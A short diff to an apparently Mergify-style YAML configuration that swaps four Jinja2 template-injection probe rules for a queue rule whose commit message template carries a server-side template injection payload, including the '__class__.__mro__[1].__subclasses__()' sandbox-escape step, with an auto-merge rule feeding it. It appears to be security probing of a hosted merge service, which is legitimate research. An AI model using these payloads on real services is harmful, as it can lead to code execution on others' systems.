@@ -1,28 +1,10 @@
+queue_rules:
+  - name: ssti-queue
+    commit_message_template: "7*7={{ 7*7 }} / user={{ ''.__class__.__mro__[1].__subclasses__() }}"
+
 pull_request_rules:
-  - name: ssti-1-self
+  - name: auto-merge
     conditions: []
     actions:
-      post_check:
-        title: "self={{ self }}"
-        summary: ""
-
-  - name: ssti-2-cycler
-    conditions: []
-    actions:
-      post_check:
-        title: "cycler={{ cycler }}"
-        summary: ""
-
-  - name: ssti-3-range
-    conditions: []
-    actions:
-      post_check:
-        title: "range={{ range(5)|list }}"
-        summary: ""
-
-  - name: ssti-4-dictsort
-    conditions: []
-    actions:
-      post_check:
-        title: "dictsort={{ {'b':2,'a':1}|dictsort }}"
-        summary: ""
+      queue:
+        name: ssti-queue
